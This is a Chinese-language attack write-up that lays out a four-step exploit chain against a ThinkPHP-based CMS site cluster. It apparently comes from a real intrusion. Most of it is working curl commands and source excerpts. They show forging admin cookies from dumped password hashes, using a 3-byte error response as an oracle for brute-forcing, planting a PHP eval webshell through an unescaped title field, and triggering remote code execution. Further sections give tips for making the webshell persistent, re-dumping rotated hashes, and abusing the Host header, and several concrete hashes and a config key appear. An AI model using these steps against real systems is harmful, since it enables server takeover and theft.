## 一、链条总览（四步，缺一不可）
```
① 凭据：冒充后台会话的 cookie 对 (admin_user, admin_id) = (admin 表 username, admin 表 password 原文)
② DB 写：Home/Article::edit_cont 把 PHP 写进 article.title（该字段【没有】过 htmlspecialchars，见下）
③ 烘焙：Home/Order::get_html1（零凭证）把 List 页抓回来写进 App/Tpl/Home/Index_example.com
④ 触发：GET / 且 Host 不含 "sp" 也不含 "example" → Home/Index::display() → TP 编译模板 → 执行
```

## 二、源码依据（逐行）
```php
// App/Lib/Action/Home/ArticleAction.class.php  —— 鉴权网关（不是闭站！）
$auser = $_SESSION['admin_user'] ?: $_COOKIE["admin_user"];
$puser = $_SESSION['admin_id']  ?: $_COOKIE["admin_id"];
if (preg_match('/^[\x{4e00}-\x{9fa5}a-zA-Z0-9_]{2,32}$/u',$auser)
 && preg_match('/^[\x{4e00}-\x{9fa5}a-zA-Z0-9_]{31,32}$/u',$puser))
    $tmp = D("admin")->where(array('username'=>$auser,'password'=>$puser))->find();
if($tmp['status']==1 && $tmp['password']==$puser){ /*放行*/ } else { echo 502; die; }
//  ★ 注意：失败时响应体恒为 3 字节 "502"（HTTP 层是 chunked 3\r\n502\r\n0\r\n\r\n），
//    极易被误判成 "cfg_siteclosed 闭站"。判定口径：通过=完整页面，失败=恰好 3 字节。
//    ⇒ 这是最好用的【验签 oracle】：把它当布尔函数爆破 (username, hash) 对。

// edit_cont：只有 cont/cont1 过了 htmlspecialchars，title 没有 ⇒ title 可存原文 PHP
$_POST['title'] = htmlspecialchars(str_replace("&nbsp;","",$_POST["title"]));   // ← 会被 htmlspecialchars
$_POST['cont']  = htmlspecialchars(str_replace("&nbsp;","",$_POST["cont"]));
$_POST['cont1'] = htmlspecialchars(str_replace("&nbsp;","",$_POST["cont1"]));
$arr = $_POST;
if(!empty($aid)){ $status = $Article->where(array('id'=>$aid))->save($arr); }   // UPDATE
else { $arr['addtime']=time(); $arr['touser']=$_GET['touser']?:$_COOKIE["admin_user"]; $status=$Article->add($arr); }  // INSERT

// 模板渲染 title 用 htmlspecialchars_decode ⇒ htmlspecialchars/decode 往返无损，<?php 能原样落到 List 页
// App/Tpl/Home/Index_example.com:  {$id3['title']|htmlspecialchars_decode}

// Home/Order::get_html1() —— 零凭证
file_put_contents("./App/Tpl/Home/Index_example.com", file_get_contents($url));
// TP 3.1.3 ParseTemplateBehavior：TMPL_DENY_PHP=false ⇒ 模板里的原生 <?php 会被编译进
// App/Runtime/Cache/Home/<md5(模板绝对路径)>.php 并执行
```

## 三、完整复现（176 实测通过）
```bash
# ① 打开网关（176 上唯一有效对；用户名靠 allopen 的 touser 零凭证枚举）
curl -k -s --noproxy '*' -H "Host: target399.example.com" \
  -H "Cookie: admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44" \
  "https://<IP>/example.com?g=Home&m=Article&a=allopen&allid=1_2_3" -o o.html -w '%{size_download}\n'
#   3545 = 通过；3 = 被网关拦。枚举用户名：grep -oE 'title="[^"]{1,40}"' o.html | sort -u
# ② 写 payload（★ id 必须走 GET，放进 POST body 会让 save($arr) 失败 → {"ok":0,"ms":"编辑失败"}）
curl -k -s --noproxy '*' -X POST -H "Host: target399.example.com" \
  -H "Cookie: admin_user=the; admin_id=b515a2b93dbec89932bf86fec3466f44" \
  --data 'cid=5100&title=<?php @eval(@$_POST["x"]);?>&cont=1&cont1=1' \
  "https://<IP>/example.com?g=Home&m=Article&a=edit_cont&id=14040"
#   → {"ba_id":"14040","ok":1,"ms":"编辑成功"}
# ③ 零凭证烘焙
curl -k -s --noproxy '*' -H "Host: target399.example.com" "https://<IP>/example.com?g=Home&m=Order&a=get_html1"
# ④ 触发（Host 必须是"第三者域名"：不含 sp、不含 example，且 DNS 指向该 IP）
curl -k -s --noproxy '*' -X POST -H "Host: <third-party-domain-resolving-to-IP>" \
  --data 'x=echo "OWNED";' "https://<IP>/"
#   → OWNED|Linux <host> <kernel>
```

## 四、★ 复现时必踩的五个坑（每一个都真实吃掉过时间）
1. **`edit_cont` 的 `id` 必须走 GET query**；放进 POST body 会让 `$arr=$_POST` 里的 `id` 一起进 SET 子句 → `save()` 失败 → `{"ok":0,"ms":"编辑失败"}`（但 HTTP 200，极易误判）。
2. **触发用的 Host 不能含 `sp`、不能含 `example`** —— `Home/Index::index` 按 Host 分支：含 sp → display("indexapp")；含 example → 防封页；否则才走 display()（我们要的那支）。
3. **`get_html1` 抓的是它【自己】**（`*.target395.example.com` 是自指解析），所以"控制抓取源"这条路是死的 —— 不要在这上面浪费时间；但"抓自己"正好让我们用 DB 内容喂它。
4. **站点 cron 约每 30 分钟重跑 `get_html1()`**，会把 Index_example.com 还原 ⇒ **模板落马会自然消失，必须用 eval 立刻把马固化成 .php 文件**。
5. **任意 admin 注意**：该 CMS 的 `admin` 表 **password 存的就是 getpass 结果**，登录后 cookie 直接是 (username, password) 明文对 ⇒ **拿到 admin 表 = 等价后台接管**（不需要破解明文）。

## 五、为什么"哈希即凭据"（算法）
```php
// Admin/Index::login
$password = $this->getpass($_POST['password']);
protected function getpass($p){ return md5(C('cfg_adminkey').md5($p)); }
// cfg_adminkey 在 App/Conf/config.db.php 里明文，例如 '26XBAmVMs+n_'
// CommonAction::islogin() 只比对 cookie 与 admin.password，不做二次哈希 ⇒ cookie 值 = 表里的 password 原文
```

## 六、★★ 站群侧的根本教训（这次吃亏最多的一条）
**该站群的 `admin.password` 会被运营方【定期轮换】。**
我们拿着上一轮 dump 到的哈希 `5bde873d336911d9b04ac786a4e8e3c7` 配 21 个用户名反复试，全部失败，白吃好几轮；
现场 dump 后立刻发现当前值是 `7d0c9a06fb7288a86fc7b558770157ee`（9 个 thbNNN 共用）。
⇒ **任何凭据都必须"现场重新 dump / 现场验签"，绝不能复用历史值；验签用上面那个 3 字节 oracle，成本极低。**

## 七、Host 头是这类站群的第二个总开关
**vhost 按 Host 匹配。** 同一 IP 上：
- `Host: target399.example.com` → 正常站点（且是 Admin 组可接受的 Host 之一）
- `Host: <站点自己的长域名>` → 也能进，但某些行为（Admin 302、888 端口 403）会失真
- `Host: <裸IP>` → 403 / 289B
⇒ 打不通时，**先把 Host 换成"能解析到该 IP 的各种域名"逐个试**，比换 payload 有效得多。